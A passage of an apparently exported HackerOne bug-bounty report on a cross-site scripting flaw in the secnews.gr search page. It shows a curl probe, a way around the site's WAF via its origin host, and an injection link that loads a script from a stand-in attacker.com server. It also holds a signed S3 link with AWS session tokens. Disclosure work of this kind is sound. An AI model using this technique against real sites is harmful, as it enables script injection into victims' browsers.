Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.\n\n```html\ncurl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o \".{47}?\u003ctest\u003e.*?\u003e\"\n\u003cdiv id=\"content\" data-currentquery='{\"s\":\"\\\\'\u003e\u003ctest\u003e\u003c\"}' class=\"main-content articles list sidebar-right    non-full\"\u003e\n```\n\nImpediments\n===\nAlthough aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.\n\n1. The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting `secnews.wpengine.com`.\n2. The website has `X-XSS-Protection` header set which enables very powerful XSS Auditor in Google Chrome.\n3. The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.\n\nSolution\n===\nOne of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.\n\nSee a proof-of-concept video: F119742\n\n1. The attacker lures the victim to visit this link:\n    ```\n    https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E\n    ```\n\n2. To any incoming requests the server at `attacker.com:9999` responds with:\n    ```\n    HTTP/1.1 200 OK\n    content-length: 39\n    access-control-allow-origin: *\n    access-control-allow-headers: x-requested-with\n    \n    \u003cscript\u003ealert(document.domain)\u003c/script\u003e\n    ```\n\n3. The victim clicks anywhere below the navigation bar.\n4. Malicious script gets downloaded and executed.\n\nSecurity Implications\n===\nAlthough this exploit requires the victim to click, I'm confident (and hope you are too) that it's only a question of time and effort to find a code path that executes injected script without user interaction.\n\nYou mention in the policy that you don't consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it's your call and I've had a lot of fun anyway.\n\n\n\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":119742,"file_name":"secnews-xss.m4v","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/119/742/4be49f47c84123dbbd54b147da62367ac5571940/secnews-xss.m4v?response-content-disposition=attachment%3B%20filename%3D%22secnews-xss.m4v%22%3B%20filename%2A%3DUTF-8%27%27secnews-xss.m4v\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3XETQKVM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135036Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCGITGEBL0GDazIgFIa28tiYmEhXENYyhaNz5SA%2FlGoWgIgUpM2O%2BqLplk1PxLgHvwucUcfaWBDs4lcpMfbeWt8lf0qgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKzBywxhiDPCGniAXCrXA0hN3FmE2a%2FvX745J3E%2FVZOyco%2FXdDJhTa6QLBz8ruxItJd7RBy%2BDgWvdA9F9VhH6hQi1%2BoGROPLiNtVXscv2SAyqwnGAvovNwUJ1XHdXq9csPneVktpMYUl5e6BGW1xCryz1JW0SV%2BUfaSbieJMT38q3eYU9Qxk5dVB%2FFSLDg1wEknhr%2FrXVV%2FyMqUg1dTUYtXEjLNILLRPWX%2F4wv3E6jg3evrZ7gOO5fAJ9yd3K5iXRj4PV28TPJwb4Bp0K3AV23Xw17YRvstL2wS%2FKJ5kkbPQixYXwVbw8yOEBuTf5C9xK0ZT%2BUy2XrR%2BHohMKCcUEmtk4PUYdUQFeneehIWQAkbd4qIQq1wWh3%2BtFZuz9DX0pjS8WWix5bToWfIKFuKulPfC5YwvJmaPyfSRVTaZ6I14bWPkalqD2SgW4Vy%2B09y41yRaXPxOlIrJMFvQS2IEJ1HEHz4ZUR1yXSp0gHeUDD8o18FKUmWJbFX0f4qg6QMujUtz72wUwuuVALx3RPw6LWvm7guP0GVvaCkepTd9y%2FQPIJ5BMWpXjOzk8woMpmPNPVmiY%2B0aJf85ceJPSOr4SQhScx2VlsmYJMnP01anhvN0NHIzV5cw9ydQaVt5O0LNrdQYH%2FIyrzC885CLBjqlAaE%2FfvTfYEPLtbspKR1t8pqzvolC92qkeVrvH%2BpD5KXCuP33P%2Bp2tmR3wVnz2EohJYzmGrrnBvRXs0coN12U37MszdI%2Bvzj6PkJc0Y4l0wDgwvf1eWilxQANi8xmwPgCDVfgGtOQp6uxiNpwW3IAibhcqSDm28IB01CUcpdI9PzabCC%2B8IpU1mKKntGaQJtzs4L%2BAHeAe57KgaMrEoYitz0ixKUbTw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a87040c85cf94613f5238643021c59ba686acd2c8de0bc8b758bf9ac32757bc3","file_size":939477,"type":"video/mp4"}],"allow_singular_disclosure_at":"2016-11-16T19:07:10.029Z","allow_singular_disclosure_after":-154637006.00941008,"singular_disclosure_allowed":true,"vote_count":1,"voters":["sumit7"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1192379,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Dear researcher\nIf you read the scope \u0026 policy of our program you will understand that we do not interested for XSS vulnerabilities at all. \nWe may only interested in complex XSS attacks that IN COMBINATION with other attacks which probably may exist, will lead to compromise of the website or exposure of\nsensitive data (like passwords, ability to upload shells etc).\nThank you very much in advance and we will be more than happy if you introduce us a severe or high risk vulnerability in the future.\n\nKind regards","automated_response":true,"created_at":"2016-09-13T22:48:38.870Z","updated_at":"2016-09-13T22:48:38.870Z","actor":{"url":"/secnews","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/417/e1ef3aeb39d84d037d6a2fb5f7c8639004c89601_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"SecNews"}},"genius_execution_id":null,"team_handle":"secnews","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1192890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Although it may be a question of language, I think you might want to either tweak your automatic response or change the wording in your policy.
